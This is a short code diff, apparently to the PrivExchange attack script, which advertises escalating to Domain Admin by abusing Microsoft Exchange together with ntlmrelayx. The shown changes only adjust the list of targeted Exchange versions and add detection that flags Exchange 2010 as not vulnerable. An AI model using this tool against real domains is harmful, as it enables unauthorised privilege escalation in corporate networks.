@@ -61,7 +61,7 @@ POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
 </soap:Envelope>
 '''
 
-EXCHANGE_VERSIONS = ["2010_SP1","2010_SP2","2010_SP3","2013","2016"]
+EXCHANGE_VERSIONS = ["2010_SP1","2010_SP2","2013","2016"]
 
 def main():
     parser = argparse.ArgumentParser(description='Exchange your privileges for Domain Admin privs by abusing Exchange. Use me with ntlmrelayx')
@@ -207,6 +207,10 @@ def main():
             logging.error('Unknown error %s', code)
             for errmsg in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseMessages'):
                 logging.error('Server returned: %s', errmsg.text)
+        # Detect Exchange 2010
+        for versioninfo in root.iter('{http://schemas.microsoft.com/exchange/services/2006/types}ServerVersionInfo'):
+            if int(versioninfo.get('MajorVersion')) == 14:
+                logging.info('Exchange 2010 detected. This version is not vulnerable to PrivExchange.')
     elif res.status == 401:
         logging.error('Server returned HTTP status 401 - authentication failed')
     else:
